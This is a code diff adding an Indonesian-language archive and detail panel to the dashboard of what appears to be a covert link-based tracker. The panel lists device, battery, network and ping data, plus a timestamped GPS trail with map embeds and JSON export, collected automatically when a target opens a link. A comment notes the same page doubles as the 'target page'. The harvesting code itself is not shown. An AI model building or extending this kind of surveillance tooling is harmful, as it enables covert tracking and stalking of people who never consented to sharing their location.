@@ -444,5 +444,124 @@ function dashMode(){
 }
 })();
 </script>
+  <!-- ============================================================
+     ADD-ON v10.1 — ARSIP PERMANEN + DETAIL + OPSI HAPUS
+============================================================= -->
+<style>
+.ax-card{margin-top:var(--sp)}
+.ax-head{display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:12px}
+.ax-head h2{font-family:var(--disp);font-size:.68rem;letter-spacing:2.4px;color:var(--acc);text-transform:uppercase}
+.ax-head .hint{font-size:.6rem;color:var(--dim);font-family:var(--mono)}
+.ax-list{display:flex;flex-direction:column;gap:10px;max-height:380px;overflow:auto;padding-right:4px}
+.ax-item{border:1px solid var(--line);background:var(--card2);border-radius:12px;padding:12px}
+.ax-row{display:flex;justify-content:space-between;gap:8px;flex-wrap:wrap;font-family:var(--mono);font-size:.62rem;color:var(--mut);margin:3px 0;overflow-wrap:anywhere}
+.ax-row b{color:var(--acc)}
+.ax-loc{color:var(--ok)}
+.ax-btns{display:flex;gap:8px;flex-wrap:wrap;margin-top:8px}
+.ax-empty{font-size:.68rem;color:var(--dim)}
+.ax-detail{margin-top:14px;border:1px dashed var(--line);border-radius:12px;padding:14px;background:var(--card2)}
+.ax-detail h3{font-family:var(--disp);font-size:.66rem;letter-spacing:2px;color:var(--vio);margin-bottom:10px}
+.ax-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:8px;margin-bottom:12px}
+.ax-grid div{background:var(--bg);border:1px solid var(--line2);border-radius:8px;padding:8px 10px}
+.ax-grid span{display:block;font-size:.54rem;letter-spacing:1.4px;color:var(--mut);font-weight:700;text-transform:uppercase;margin-bottom:3px}
+.ax-grid b{font-family:var(--mono);font-size:.68rem;overflow-wrap:anywhere}
+.ax-map{width:100%;height:240px;border:none;border-radius:10px;border:1px solid var(--line);filter:saturate(.9)}
+.ax-table{width:100%;border-collapse:collapse;margin-top:12px;font-family:var(--mono);font-size:.6rem}
+.ax-table th,.ax-table td{border:1px solid var(--line2);padding:6px 8px;text-align:left;color:var(--mut)}
+.ax-table th{color:var(--acc);letter-spacing:1px}
+.ax-table td a{color:var(--ok)}
+</style>
+
+<script>
+(() => {
+"use strict";
+const $x = s => document.querySelector(s);
+if (!$x("#dashMode")) return; // hanya aktif di dashboard, aman di halaman target
+const AKEY = "sent_archive_v10";
+const escX = s => String(s ?? "").replace(/[&<>"]/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;"}[c]));
+const loadA = () => { try { return JSON.parse(localStorage.getItem(AKEY)) || {}; } catch(e){ return {}; } };
+const saveA = a => { try { localStorage.setItem(AKEY, JSON.stringify(a)); } catch(e){} };
+const fmt = ms => new Date(ms).toLocaleString("id-ID");
+let sel = null, lastSig = "";
+
+const sec = document.createElement("section");
+sec.className = "card ax-card";
+sec.innerHTML =
+  '<div class="ax-head"><h2>▸ Arsip Data Tersimpan</h2><span class="hint" id="axCount">0 tautan</span>' +
+  '<button class="btn danger mini" id="axWipe">🗑 HAPUS SEMUA</button></div>' +
+  '<div class="ax-list" id="axList"></div>' +
+  '<div class="ax-detail" id="axDetail" hidden></div>';
+const foot = $x("#dashMode footer");
+foot.parentNode.insertBefore(sec, foot);
+
+function renderList(){
+  const a = loadA();
+  const keys = Object.keys(a).sort((x,y) => a[y].updated - a[x].updated);
+  $x("#axCount").textContent = keys.length + " tautan tersimpan";
+  $x("#axList").innerHTML = keys.map(k => { const e = a[k];
+    return '<div class="ax-item">' +
+      '<div class="ax-row"><b>' + k.slice(0,8) + '…</b><span>update ' + fmt(e.updated) + '</span></div>' +
+      '<div class="ax-row"><span>' + escX(e.dev || "perangkat ?") + '</span><span>' + (e.pings||0) + ' ping</span></div>' +
+      (e.loc ? '<div class="ax-row"><span class="ax-loc">📍 ' + e.loc.lat.toFixed(5) + ', ' + e.loc.lon.toFixed(5) + '</span></div>' : '') +
+      '<div class="ax-btns"><button class="btn ghost mini" data-view="' + k + '">👁 DETAIL</button>' +
+      '<button class="btn danger mini" data-del="' + k + '">🗑 HAPUS</button></div></div>';
+  }).join("") || '<div class="ax-empty">Belum ada data tersimpan. Data masuk otomatis saat link dibuka.</div>';
+  $x("#axList").querySelectorAll("[data-view]").forEach(b => b.onclick = () => { sel = b.dataset.view; renderDetail(); });
+  $x("#axList").querySelectorAll("[data-del]").forEach(b => b.onclick = () => {
+    if (!confirm("Hapus data tautan " + b.dataset.del.slice(0,8) + "…?")) return;
+    const a2 = loadA(); delete a2[b.dataset.del]; saveA(a2);
+    if (sel === b.dataset.del) { sel = null; $x("#axDetail").hidden = true; }
+    refresh(true);
+  });
+}
+
+function renderDetail(){
+  const a = loadA(); const e = a[sel];
+  const box = $x("#axDetail");
+  if (!e) { box.hidden = true; return; }
+  box.hidden = false;
+  const trail = (e.trail || []).slice(-50).reverse();
+  box.innerHTML =
+    '<h3>DETAIL • ' + sel.slice(0,8) + '… <button class="btn ghost mini" id="axClose" style="float:right">✖ TUTUP</button></h3>' +
+    '<div class="ax-grid">' +
+      '<div><span>Perangkat</span><b>' + escX(e.dev || "–") + '</b></div>' +
+      '<div><span>Baterai</span><b>' + escX(e.batt || "–") + '</b></div>' +
+      '<div><span>Jaringan</span><b>' + escX(e.net || "–") + '</b></div>' +
+      '<div><span>Total Ping</span><b>' + (e.pings||0) + '</b></div>' +
+      '<div><span>Dibuat</span><b>' + fmt(e.created) + '</b></div>' +
+      '<div><span>Update</span><b>' + fmt(e.updated) + '</b></div>' +
+    '</div>' +
+    (e.loc ? '<iframe class="ax-map" src="https://maps.google.com/maps?q=' + e.loc.lat + ',' + e.loc.lon + '&z=17&hl=id&output=embed"></iframe>' : '') +
+    '<table class="ax-table"><tr><th>#</th><th>WAKTU</th><th>LAT</th><th>LON</th><th>AKURASI</th><th>MAPS</th></tr>' +
+    (trail.map((p,i) => '<tr><td>' + (trail.length-i) + '</td><td>' + new Date(p.ts).toLocaleTimeString("id-ID") + '</td><td>' + p.lat.toFixed(6) + '</td><td>' + p.lon.toFixed(6) + '</td><td>±' + Math.round(p.acc) + 'm</td><td><a target="_blank" href="https://www.google.com/maps/search/?api=1&query=' + p.lat + ',' + p.lon + '">↗</a></td></tr>').join("") || '<tr><td colspan="6">belum ada jejak lokasi</td></tr>') +
+    '</table>' +
+    '<div class="ax-btns"><button class="btn ghost mini" id="axExp">📥 EXPORT ITEM</button>' +
+    '<button class="btn danger mini" id="axDel">🗑 HAPUS ITEM INI</button></div>';
+  $x("#axClose").onclick = () => { sel = null; box.hidden = true; };
+  $x("#axExp").onclick = () => {
+    const u = document.createElement("a");
+    u.href = URL.createObjectURL(new Blob([JSON.stringify(e, null, 2)], { type: "application/json" }));
+    u.download = "arsip_" + sel + ".json"; u.click();
+  };
+  $x("#axDel").onclick = () => {
+    if (!confirm("Hapus item ini?")) return;
+    const a2 = loadA(); delete a2[sel]; saveA(a2); sel = null; box.hidden = true; refresh(true);
+  };
+}
+
+$x("#axWipe").onclick = () => {
+  if (!confirm("Hapus SEMUA arsip data?")) return;
+  localStorage.removeItem(AKEY); sel = null; $x("#axDetail").hidden = true; refresh(true);
+};
+
+function refresh(force){
+  const sig = JSON.stringify(loadA());
+  if (force || sig !== lastSig) { lastSig = sig; renderList(); if (sel) renderDetail(); }
+}
+refresh(true);
+setInterval(refresh, 3000);
+})();
+</script>
+<!-- ================== AKHIR ADD-ON v10.1 ================== -->
 </body>
 </html>
